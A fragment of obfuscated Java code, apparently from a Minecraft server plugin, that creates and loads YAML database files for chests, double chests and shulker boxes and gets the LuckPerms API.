        this.g20 = YamlConfiguration.loadConfiguration(g16); // viewonlychestconfig
        this.g13 = new File(u4ndy24und24yd);
        if (!g13.exists()) {
            g13.mkdirs();
        }
        this.g14 = new File(g13, yudn3wypu4ndh);
        if (!g14.exists()) {
            try {
                g14.createNewFile();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        this.g18 = YamlConfiguration.loadConfiguration(g14); //databaseconfig

        // Double chest database
        this.g15 = new File(g13, dyu2n4dyun2f4);
        if (!g15.exists()) {
            try {
                g15.createNewFile();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }


        g28 = new String(g27);
        this.g17 = YamlConfiguration.loadConfiguration(g15);

        g12 = new File(y24und);
        if (!g12.exists()) {
            g12.mkdirs();
        }

        g21 = new File(y2u4dhyu2nd);
        g22 = new LinkedHashMap<>();
        g23();
        this.g23 = LuckPermsProvider.get();
        g23.getUserManager();


        File tnyu2nd = new File(yn23yund2y3udn);
        if (!tnyu2nd.exists()) tnyu2nd.mkdirs();
        this.f123 = new File(tnyu2nd, ydun2ydun23d); //shulkerDatabaseFile
        if (!f123.exists()) {
            try { f123.createNewFile(); }
            catch(IOException e){ e.printStackTrace(); }
        }
        this.g2 = YamlConfiguration.loadConfiguration(f123); // shulkerdatabaseconfig



        ilc();



    }

}